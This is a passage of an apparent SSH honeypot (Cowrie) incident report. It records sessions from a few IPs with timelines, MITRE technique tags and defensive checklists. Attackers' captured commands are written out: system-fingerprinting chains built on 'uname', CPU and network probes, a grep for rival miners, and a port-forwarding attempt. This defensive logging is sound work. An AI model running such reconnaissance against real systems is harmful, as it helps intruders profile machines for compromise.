| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.command.input` |
| `2026-09-05 11:01:51` | `cowrie.log.closed` |
| `2026-09-05 11:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb727e17796

| Field | Detail |
|---|---|
| **Source IP** | `220.85.210[.]200` |
| **First Seen** | 2026-09-05 11:02 |
| **Last Seen** | 2026-09-05 11:03 |
| **Session Duration** | 42s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:02:37` | `cowrie.session.connect` |
| `2026-09-05 11:02:37` | `cowrie.client.version` |
| `2026-09-05 11:02:38` | `cowrie.client.kex` |
| `2026-09-05 11:02:38` | `cowrie.login.failed` |
| `2026-09-05 11:02:40` | `cowrie.login.success` |
| `2026-09-05 11:02:41` | `cowrie.session.params` |
| `2026-09-05 11:02:41` | `cowrie.command.input` |
| `2026-09-05 11:02:41` | `cowrie.command.failed` |
| `2026-09-05 11:02:41` | `cowrie.log.closed` |
| `2026-09-05 11:02:42` | `cowrie.session.params` |
| `2026-09-05 11:02:42` | `cowrie.command.input` |
| `2026-09-05 11:02:42` | `cowrie.log.closed` |
| `2026-09-05 11:02:43` | `cowrie.session.params` |
| `2026-09-05 11:02:43` | `cowrie.command.input` |
| `2026-09-05 11:02:43` | `cowrie.log.closed` |
| `2026-09-05 11:02:44` | `cowrie.session.params` |
| `2026-09-05 11:02:44` | `cowrie.command.input` |
| `2026-09-05 11:02:44` | `cowrie.log.closed` |
| `2026-09-05 11:02:45` | `cowrie.session.params` |
| `2026-09-05 11:02:45` | `cowrie.command.input` |
| `2026-09-05 11:02:46` | `cowrie.log.closed` |
| `2026-09-05 11:02:47` | `cowrie.session.params` |
| `2026-09-05 11:02:47` | `cowrie.command.input` |
| `2026-09-05 11:02:47` | `cowrie.log.closed` |
| `2026-09-05 11:02:48` | `cowrie.session.params` |
| `2026-09-05 11:02:48` | `cowrie.command.input` |
| `2026-09-05 11:02:48` | `cowrie.log.closed` |
| `2026-09-05 11:02:49` | `cowrie.session.params` |
| `2026-09-05 11:02:49` | `cowrie.command.input` |
| `2026-09-05 11:02:49` | `cowrie.log.closed` |
| `2026-09-05 11:02:51` | `cowrie.session.params` |
| `2026-09-05 11:02:51` | `cowrie.command.input` |
| `2026-09-05 11:02:51` | `cowrie.log.closed` |
| `2026-09-05 11:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.85.210[.]200` to AbuseIPDB if not already reported
- [ ] Block `220.85.210[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77d341ec79b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:04 |
| **Last Seen** | 2026-09-05 11:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:04:10` | `cowrie.session.connect` |
| `2026-09-05 11:04:10` | `cowrie.client.version` |
| `2026-09-05 11:04:10` | `cowrie.client.kex` |
| `2026-09-05 11:04:11` | `cowrie.login.success` |
| `2026-09-05 11:04:12` | `cowrie.session.params` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.success` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.command.input` |
| `2026-09-05 11:04:12` | `cowrie.log.closed` |
| `2026-09-05 11:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbb259fd69f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:06 |
| **Last Seen** | 2026-09-05 11:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:06:27` | `cowrie.session.connect` |
| `2026-09-05 11:06:27` | `cowrie.client.version` |
| `2026-09-05 11:06:27` | `cowrie.client.kex` |
| `2026-09-05 11:06:28` | `cowrie.login.success` |
| `2026-09-05 11:06:29` | `cowrie.session.params` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.success` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.command.input` |
| `2026-09-05 11:06:29` | `cowrie.log.closed` |
| `2026-09-05 11:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b416d810680

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:08 |
| **Last Seen** | 2026-09-05 11:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:08:32` | `cowrie.session.connect` |
| `2026-09-05 11:08:32` | `cowrie.client.version` |
| `2026-09-05 11:08:32` | `cowrie.client.kex` |
| `2026-09-05 11:08:33` | `cowrie.login.success` |
| `2026-09-05 11:08:34` | `cowrie.session.params` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.success` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:34` | `cowrie.command.input` |
| `2026-09-05 11:08:35` | `cowrie.log.closed` |
| `2026-09-05 11:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dee12265926

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:10 |
| **Last Seen** | 2026-09-05 11:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:10:37` | `cowrie.session.connect` |
| `2026-09-05 11:10:38` | `cowrie.client.version` |
| `2026-09-05 11:10:38` | `cowrie.client.kex` |
| `2026-09-05 11:10:39` | `cowrie.login.success` |
| `2026-09-05 11:10:40` | `cowrie.session.params` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.success` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.command.input` |
| `2026-09-05 11:10:40` | `cowrie.log.closed` |
| `2026-09-05 11:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-257c28f16143

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:12 |
| **Last Seen** | 2026-09-05 11:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:12:44` | `cowrie.session.connect` |
| `2026-09-05 11:12:44` | `cowrie.client.version` |
| `2026-09-05 11:12:44` | `cowrie.client.kex` |
| `2026-09-05 11:12:46` | `cowrie.login.success` |
| `2026-09-05 11:12:47` | `cowrie.session.params` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.success` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.command.input` |
| `2026-09-05 11:12:47` | `cowrie.log.closed` |
| `2026-09-05 11:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b497ce3fe69e

| Field | Detail |
|---|---|
| **Source IP** | `64.62.156[.]108` |
| **First Seen** | 2026-09-05 11:13 |
| **Last Seen** | 2026-09-05 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:13:08` | `cowrie.session.connect` |
| `2026-09-05 11:13:08` | `cowrie.login.success` |
| `2026-09-05 11:13:09` | `cowrie.session.params` |
| `2026-09-05 11:13:09` | `cowrie.command.input` |
| `2026-09-05 11:13:09` | `cowrie.command.input` |
| `2026-09-05 11:13:09` | `cowrie.command.failed` |
| `2026-09-05 11:13:09` | `cowrie.command.input` |
| `2026-09-05 11:13:09` | `cowrie.command.failed` |
| `2026-09-05 11:13:09` | `cowrie.command.input` |
| `2026-09-05 11:13:09` | `cowrie.log.closed` |
| `2026-09-05 11:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.62.156[.]108` to AbuseIPDB if not already reported
- [ ] Block `64.62.156[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0659b39bbe2d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:16 |
| **Last Seen** | 2026-09-05 11:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:16:38` | `cowrie.session.connect` |
| `2026-09-05 11:16:38` | `cowrie.client.version` |
| `2026-09-05 11:16:38` | `cowrie.client.kex` |
| `2026-09-05 11:16:40` | `cowrie.login.success` |
| `2026-09-05 11:16:42` | `cowrie.session.params` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.success` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.command.input` |
| `2026-09-05 11:16:42` | `cowrie.log.closed` |
| `2026-09-05 11:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17cd45e5c481

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:18 |
| **Last Seen** | 2026-09-05 11:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:18:42` | `cowrie.session.connect` |
| `2026-09-05 11:18:42` | `cowrie.client.version` |
| `2026-09-05 11:18:42` | `cowrie.client.kex` |
| `2026-09-05 11:18:44` | `cowrie.login.success` |
| `2026-09-05 11:18:45` | `cowrie.session.params` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.success` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.command.input` |
| `2026-09-05 11:18:45` | `cowrie.log.closed` |
| `2026-09-05 11:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b17bd72c487e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:20 |
| **Last Seen** | 2026-09-05 11:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:20:41` | `cowrie.session.connect` |
| `2026-09-05 11:20:42` | `cowrie.client.version` |
| `2026-09-05 11:20:42` | `cowrie.client.kex` |
| `2026-09-05 11:20:43` | `cowrie.login.success` |
| `2026-09-05 11:20:44` | `cowrie.session.params` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.success` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:44` | `cowrie.command.input` |
| `2026-09-05 11:20:45` | `cowrie.log.closed` |
| `2026-09-05 11:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9da43496e223

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:22 |
| **Last Seen** | 2026-09-05 11:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:22:34` | `cowrie.session.connect` |
| `2026-09-05 11:22:34` | `cowrie.client.version` |
| `2026-09-05 11:22:34` | `cowrie.client.kex` |
| `2026-09-05 11:22:36` | `cowrie.login.success` |
| `2026-09-05 11:22:37` | `cowrie.session.params` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.success` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:37` | `cowrie.command.input` |
| `2026-09-05 11:22:38` | `cowrie.log.closed` |
| `2026-09-05 11:22:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2140289106ee

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 11:23 |
| **Last Seen** | 2026-09-05 11:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:23:53` | `cowrie.session.connect` |
| `2026-09-05 11:23:53` | `cowrie.client.version` |
| `2026-09-05 11:23:53` | `cowrie.client.kex` |
| `2026-09-05 11:23:54` | `cowrie.login.success` |
| `2026-09-05 11:23:54` | `cowrie.direct-tcpip.request` |
| `2026-09-05 11:23:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 11:23:54` | `cowrie.direct-tcpip.data` |
| `2026-09-05 11:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa57e4ca3c89

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:24 |
| **Last Seen** | 2026-09-05 11:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:24:25` | `cowrie.session.connect` |
| `2026-09-05 11:24:25` | `cowrie.client.version` |
| `2026-09-05 11:24:25` | `cowrie.client.kex` |
| `2026-09-05 11:24:26` | `cowrie.login.success` |
| `2026-09-05 11:24:27` | `cowrie.session.params` |
